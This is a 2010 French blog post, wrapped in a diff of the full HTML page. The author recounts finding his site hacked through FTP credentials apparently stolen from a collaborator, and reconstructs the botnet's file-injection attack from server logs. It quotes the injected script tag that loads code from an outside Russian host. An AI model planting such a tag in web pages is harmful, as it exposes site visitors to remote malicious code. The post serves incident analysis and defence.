@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en-gb" dir="ltr">
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta charset="utf-8" />
+	<base href="https://blog.neamar.fr" />
+	<meta name="author" content="Neamar" />
+	<meta name="description" content="Distributeur de liens !" />
+	<meta name="generator" content="Joomla! - Open Source Content Management" />
+	<title>Hacké !</title>
+	<link href="https://blog.neamar.fr/autres-articles/151-recit-dune-attaque-pas-trop-mechante" rel="canonical" />
+	<link href="/templates/protostar/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+	<link href="/templates/protostar/css/template.css?4847224b99c9894da868618d8285f3c1" rel="stylesheet" />
+	<link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" />
+	<style>
+
+	h1, h2, h3, h4, h5, h6, .site-title {
+		font-family: 'Open Sans', sans-serif;
+	}
+	body.site {
+		border-top: 3px solid #0088cc;
+		background-color: #f4f6f7;
+	}
+	a {
+		color: #0088cc;
+	}
+	.nav-list > .active > a,
+	.nav-list > .active > a:hover,
+	.dropdown-menu li > a:hover,
+	.dropdown-menu .active > a,
+	.dropdown-menu .active > a:hover,
+	.nav-pills > .active > a,
+	.nav-pills > .active > a:hover,
+	.btn-primary {
+		background: #0088cc;
+	}
+	</style>
+	<script src="/media/jui/js/jquery.min.js"></script>
+	<script src="/media/jui/js/jquery-noconflict.js"></script>
+	<script src="/media/jui/js/jquery-migrate.min.js"></script>
+	<script src="/media/system/js/caption.js"></script>
+	<script src="/media/jui/js/bootstrap.min.js"></script>
+	<script src="/templates/protostar/js/template.js?4847224b99c9894da868618d8285f3c1"></script>
+	<script>
+jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});jQuery(function($){ $(".hasTooltip").tooltip({"html": true,"container": "body"}); });
+	</script>
+
+	<!--[if lt IE 9]><script src="/media/jui/js/html5.js"></script><![endif]-->
+</head>
+<body class="site com_content view-article no-layout no-task itemid-103">
+	<!-- Body -->
+	<div class="body">
+		<div class="container">
+			<!-- Header -->
+			<header class="header" role="banner">
+				<div class="header-inner clearfix">
+					<a class="brand pull-left" href="/">
+						<span class="site-title" title="Blog de Neamar">Blog de Neamar</span>											</a>
+					<div class="header-search pull-right">
+						
+					</div>
+				</div>
+			</header>
+						
+			<div class="row-fluid">
+								<main id="content" role="main" class="span9">
+					<!-- Begin Content -->
+					
+					<div id="system-message-container">
+	</div>
+
+					<div class="item-page" itemscope itemtype="https://schema.org/Article">
+	<meta itemprop="inLanguage" content="en-GB" />
+	
+		
+			<div class="page-header">
+					<h2 itemprop="headline">
+				Hacké !			</h2>
+									</div>
+							
+<div class="icons">
+	
+					<div class="btn-group pull-right">
+				<a class="btn dropdown-toggle" data-toggle="dropdown" href="#"> <span class="icon-cog"></span><span class="caret"></span> </a>
+								<ul class="dropdown-menu">
+																<li class="email-icon"> <a href="/component/mailto/?tmpl=component&amp;template=protostar&amp;link=bef8ae596a91f46c9875dbeec806bb24eeef9104" title="Email this link to a friend" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;" rel="nofollow"><span class="icon-envelope"></span>Email</a> </li>
+														</ul>
+			</div>
+		
+	</div>
+			
+				<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+									Details							</dt>
+
+							<dd class="createdby" itemprop="author" itemscope itemtype="https://schema.org/Person">
+					Written by <span itemprop="name">Neamar</span>	</dd>
+			
+			
+										<dd class="category-name">
+													Category: <span itemprop="genre">Articles du blog</span>							</dd>			
+					
+												<dd class="create">
+					<span class="icon-calendar"></span>
+					<time datetime="2010-07-12T13:44:43+00:00" itemprop="dateCreated">
+						Created: 12 July 2010					</time>
+			</dd>			
+										<dd class="modified">
+				<span class="icon-calendar"></span>
+				<time datetime="2013-08-13T07:20:40+00:00" itemprop="dateModified">
+					Last Updated: 13 August 2013				</time>
+			</dd>			
+						</dl>
+	
+	
+				
+								<div itemprop="articleBody">
+		<p>Rentrant tranquillement de week-end, je découvre un de mes sites dans un état bizarre&nbsp;: </p>
+
+<pre xml:lang="html4">
+Parse error: syntax error, unexpected '<' in /un/chemin/absolu/index.php on line 199
+</pre>
+
+<p>Étrange, j'avais pourtant un site fonctionnel en partant. Peut-être un collaborateur qui a fait un fausse manip&nbsp;? </p>
+
+<p>En fait, j'allais rapidement comprendre que non...</p>
+
+ 
+
+<p>Ouverture du sftp, connexion, ouverture du fichier, descente à la ligne 199… et là, c'est le drame. Car sur la ligne 199&nbsp;se trouve un texte qui n'a rien à faire là&nbsp;: </p>
+
+<pre xml:lang="html4">
+&lt;script type="text/javascript" src="http://pantscow.ru:8080/Null.js"&gt;&lt;/script&gt;
+&lt;!--bf9692d0db46c6fdb7ec01b9eb789955--&gt;
+</pre>
+
+<p>Il ne faut pas longtemps pour comprendre que le site a été hacké – d'autant qu'un ami a déjà été confronté à ce problème de «&nbsp;script en fin de page&nbsp;». Dans mon cas, le script n'a servi à rien, puisqu'il était dans une zone PHP, ce qui faisait bugger l'interpréteur et évitait l'envoi de code malicieux au client. De toute façon, c'est un site en travaux sur lequel seuls les développeurs se rendent… </p>
+
+<p>Je supprime les deux lignes, avec un mauvais pressentiment&nbsp;: si c'est là, ça peut être sur tous mes sites&nbsp;! Car la plupart de mes index.php se terminent par du HTML, et là le script serait furtivement actif, et sur des sites visités par des innocents&nbsp;! Après un rapide tour d'horizon, tout va bien&nbsp;: seul ce site semble souffrir du problème. <br />
+Moment de réflexion&nbsp;: pourquoi un ver ne s'attaquerait-il qu'à ce site (qui n'est, physiquement, qu'un sous dossier de dossier par rapport à la racine de mes sites)&nbsp;? Quelques secondes de réflexion sans réponses, j'enregistre mon fichier et je recharge la page sans autre forme de procès. Sauf que… le problème reste similaire, mais sur une autre page&nbsp;: C/index.php (j'utilise une architecture MVC pour ce site, et le chargement d'index.php inclura donc C/index.php). Je maugrée, mais il me faut me rendre à l'évidence&nbsp;: tous les fichiers index.php ont été modifiés pour inclure le code probablement malicieux. </p>
+
+<p>Décidé à ne pas prendre plus de risques, je me plonge dans les logs serveurs ftp à la recherche des modifications. Côté sftp, rien à signaler. Côté ftp… plus intéressant, puisque ma recherche <tt>STOR index.php</tt> me permet de comprendre pourquoi seul ce sous-site est hacké&nbsp;: c'est un collaborateur (nommé X pour protéger sa vie privée&nbsp;; )) qui travaillait sur le projet. <br />
+Comme je suis un peu parano, quand je donne des accès FTP à mon serveur (que ce soit pour les références de Reflets d'Acide, le maintien d'un site, le graphisme, l'échange de bons procédés en gage de confiances… ), je limite les actions possibles par la personne au strict minimum&nbsp;; en faisant passer le dossier de connexion (par exemple, /Res/Reflets/Textes) pour le dossier racine&nbsp;: ainsi, la personne ne voit rien de ce qui est au dessus&nbsp;: en se connectant, son / correspondra à mon /Res/Reflets/Textes. La stratégie aura été payante aujourd'hui, puisqu'elle m'aura évitée de devoir modifier plusieurs centaines (au bas mot) de fichiers index.php. </p>
+
+<p>Rapidement, je modifie le mot de passe de la personne en cause, puis jette un œil pour comprendre le déroulement de l'attaque&nbsp;: j'étais sûr que ce n'était pas X qui avait lui même modifié les fichiers, d'abord parce que je lui fais largement confiance, et ensuite parce que l'attaque était menée de façon bien trop générique (et dans mon cas, stupide&nbsp;! ) pour être l'œuvre d'un humain. </p>
+
+<h2>Les faits</h2>
+<p>Et effectivement, l'analyse des logs montre clairement qu'il s'agit d'un réseau automatique (et plutôt bien organisé). Petit historique pour les curieux. Notez que je n'ai bien évidemment pas les sources du bot, et que tous les commentaires ne sont que ma propre interprétation du fonctionnement analysé depuis l'extérieur&nbsp;: </p>
+
+
+<ol>
+<li><small><span style="color:gray;">(14&nbsp;: 31&nbsp;: 58)</span></small> 67.15.107.166 se connecte au site, et ne fait rien&nbsp;: <tt>PASS</tt>, <tt>PWD</tt>, <tt>EPSV</tt>, <tt>TYPE A</tt>, <tt>LIST</tt>, <tt>QUIT</tt>. En fait, il vérifie juste que les identifiants de connexion sont valides (<tt>PASS successful</tt>) et que le site n'est pas vide (est exploitable) (la commande <tt>LIST</tt>).</li>
+<li><small><span style="color:gray;">(16&nbsp;: 05&nbsp;: 32)</span></small> 173.45.101.162 se connecte. C'est lui qui va faire le plus gros boulot&nbsp;: il liste récursivement dossiers et sous dossiers (avec un algorithme de type <a href="http://fr.wikipedia.org/wiki/Algorithme_de_parcours_en_profondeur">Depth First Search</a>). Il fait ça rapidement, puisqu'à 16&nbsp;: 06&nbsp;: 12&nbsp;il a fini son boulot (uniquement des <tt>CWD</tt> et des <tt>LIST</tt> donc, avec quelques <tt>EPSV</tt> de temps en temps pour se reposer&nbsp;! ). Celui-la a donc regardé tous les fichiers potentiellement infectables (les index.php et *. js comme on le verra plus tard), mais n'a toujours rien fait de répréhensible – enfin, à part s'introduire frauduleusement dans un réseau après avoir dérobé illégalement des informations privées, mais passons&nbsp;!</li>
+<li><small><span style="color:gray;">(16&nbsp;: 08&nbsp;: 33)</span></small> 204.15.9.153 se connecte, récupère (<tt>RETR</tt>) /index.php… et se déconnecte.</li>
+<li><small><span style="color:gray;">(16&nbsp;: 08&nbsp;: 36)</span></small> 204.16.203.11 se connecte, et envoie (<tt>STOR</tt>) /index.php (auquel il a adjoint la balise script). Comme le contenu précédent n'a pas été modifié, on en déduit (si on en doutait encore&nbsp;! ) que tout ce petit monde est de mèche et travaille ensemble, fragmentant les opérations pour éviter d'être repéré.</li>
+<li><small><span style="color:gray;">(16&nbsp;: 08&nbsp;: 40)</span></small> 70.150.220.35 se connecte, récupère un fichier index.php au fin fond de l'arborescence (à grands coups de <tt>CWD</tt>), le récupère et se déconnecte.</li>
+<li>Et ainsi de suite pour chaque fichier index.php (et scripts js)&nbsp;: à chaque fois une adresse IP différente (173.9.243.213, 68.233.4.27, 74.208.43.175, 68.71.134.23, 208.101.21.82, 150.140.9.29, 87.106.14.44, 74.55.142.202, 195.189.203.1 j'arrête là j'en ai marre)&nbsp;: un qui <tt>SIZE</tt> puis <tt>RETR</tt>, et un qui <tt>STOR</tt>. Une mécanique bien huilée, y a pas à dire.</li>
+<li><small><span style="color:gray;">(16&nbsp;: 10&nbsp;: 08)</span></small> 38.114.169.44 se déconnecte&nbsp;: c'est le dernier à me rendre visite&nbsp;: l'attaque aura pris 1 heure, 38&nbsp;minutes et 10 secondes. 
+</li>
+</ol>
+
+<h3>Origine du problème</h3>
+<p>Après investigation chez X, il utilisait FileZilla. Ce logiciel est très agréable à utiliser, mais présente l'énorme inconvénient d'offrir des possibilités d'export des données en clair. Il y a donc très probablement eu un malware sur le PC de X qui a envoyé toutes ces données à l'étranger… </p>
+
+<h3>Qui c'est&nbsp;? </h3>
+<p>Qui est derrière cet énigmatique pantscow.ru&nbsp;? <br />
+Ils ont laissé derrière eux deux infos bien utiles&nbsp;: d'abord, le nom du domaine, et aussi leur adresse IP. <br />
+La première (<a href="http://www.localiser-ip.com/?ip=67.15.107.166">67.15.107.166</a>, l'éclaireur qui vérifiait les infos de connexion) vient de Suède. Ensuite, ça part dans tous les sens&nbsp;: dans l'<a href="http://www.localiser-ip.com/?ip=173.45.101.162">Ohio</a>, le <a href="http://www.localiser-ip.com/?ip=204.15.9.153">New Jersey</a>, l'<a href="http://www.localiser-ip.com/?ip=04.16.203.11">Ontario</a>, <a href="http://www.localiser-ip.com/?ip=70.150.220.35">Floride</a>. <br />
+Ce qui est marrant, c'est que ces IPs redirigent vers des petits sites (<a href="http://204.16.203.11/" rel="nofollow">204.16.203.11/</a>, <a href="http://70.150.220.35" rel="nofollow">70.150.220.35</a>). Ajoutons aussi que ces IP ne sont pas considérées comme <a href="http://www.trustedsource.org/TS?do=feedback&amp;subdo=query&amp;q=70.150.220.35">dangereuses</a>&nbsp;! </p>
+
+<p>Bon, cela mériterait plus d'investigations sur chaque IP, mais je n'en ai pas le temps. Je suppose qu'il s'agit tout simplement de proxys, et que derrière une seule IP sert de maître manipulateur. Mais cela n'est qu'une supposition… </p>
+
+<h3>Et le script, il fait quoi&nbsp;? </h3>
+<p>Hé bien… il est constitué de sauts de lignes. Ce n'est donc pas (où ne semble pas être) une attaque javascript… à mon avis, la solution est dans le numéro du port&nbsp;: le script fait télécharger le script sur le port <a href="http://www.auditmypc.com/port/tcp-port-8080.asp">8&nbsp;080</a>, connu pour être utilisé par RingZero. <br />
+Mais dans ce cas, pourquoi passer par un script&nbsp;? Une image aurait fait l'affaire (en la chargeant aussi sur 8&nbsp;080), et aurait gardé le canal ouvert plus longtemps. Mais peut-être qu'il n'y a pas besoin d'un long temps&nbsp;? Et puis, un script qui ne fait rien est bien plus discret qu'une image&nbsp;! </p>	</div>
+
+	
+							</div>
+
+					
+<ul itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb">
+			<li>
+			You are here: &#160;
+		</li>
+	
+				<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+									<a itemprop="item" href="/" class="pathway"><span itemprop="name">Home</span></a>
+				
+									<span class="divider">
+						<img src="/media/system/images/arrow.png" alt="" />					</span>
+								<meta itemprop="position" content="1">
+			</li>
+					<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+									<a itemprop="item" href="/autres-articles" class="pathway"><span itemprop="name">Articles du blog</span></a>
+				
+									<span class="divider">
+						<img src="/media/system/images/arrow.png" alt="" />					</span>
+								<meta itemprop="position" content="2">
+			</li>
+					<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="active">
+				<span itemprop="name">
+					Hacké !				</span>
+				<meta itemprop="position" content="3">
+			</li>
+		</ul>
+
+					<!-- End Content -->
+				</main>
+									<div id="aside" class="span3">
+						<!-- Begin Right Sidebar -->
+						<div class="well _menu"><h3 class="page-header">Main Menu</h3><ul class="nav menu">
+<li class="item-104 default"><a href="/" >Blog de Neamar</a></li><li class="item-103 current active"><a href="/autres-articles" >Articles du blog</a></li><li class="item-105"><a href="/les-liens-du-jeudi" >Les liens du jeudi</a></li></ul>
+</div>
+						<!-- End Right Sidebar -->
+					</div>
+							</div>
+		</div>
+	</div>
+	<!-- Footer -->
+	<footer class="footer" role="contentinfo">
+		<div class="container">
+			<hr />
+			
+			<p class="pull-right">
+				<a href="#" id="back-top">
+					Back to Top				</a>
+			</p>
+			<p>
+				&copy; 2024 Blog de Neamar			</p>
+		</div>
+	</footer>
+	
+</body>
+</html>
